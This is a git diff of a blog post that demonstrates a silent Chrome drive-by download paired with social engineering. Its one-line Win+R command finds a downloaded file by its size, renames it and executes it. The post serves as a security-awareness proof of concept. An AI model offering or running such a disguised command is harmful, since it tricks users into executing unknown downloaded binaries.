@@ -4,7 +4,7 @@ title: Don't run commands you don't understand
 comments: true
 ---
 
-This demonstrates a fully silent drive-by download in Google Chrome (rather similar to CVE-2011-0611, but without the automatic execution part), as well as some social engineering magic: a PoC binary will execute if the below seemingly harmless command line is entered in a **Win+R** prompt on a Windows system. Note that you may need to wait for a few seconds before the fun starts.
+This demonstrates a silent drive-by download in Google Chrome (rather similar to CVE-2011-0611, less the actual execution), as well as some social engineering magic: a PoC binary will execute if the below seemingly harmless command line is entered in a **Win+R** prompt on a Windows system. Note that you may need to wait for a few seconds before the fun starts.
 
 <div style= "padding: 2px 4px;  background-color: #de9393; padding-top: 9px ; border: 1px solid #ccc; display:table">
 <div style= "padding: 2px 4px;  background-color: #de9393;  width:720px ; display:inline-block;">
@@ -13,7 +13,7 @@ This demonstrates a fully silent drive-by download in Google Chrome (rather simi
 </div>
 </div>
 
-**Just run this and be surprised:**
+**Harmless PoC executable**
 
 <pre>
 cmd /c for /r %g in (*_*) do if %~zg==23456 copy /y "%g" "%g.log" & "%g.log"
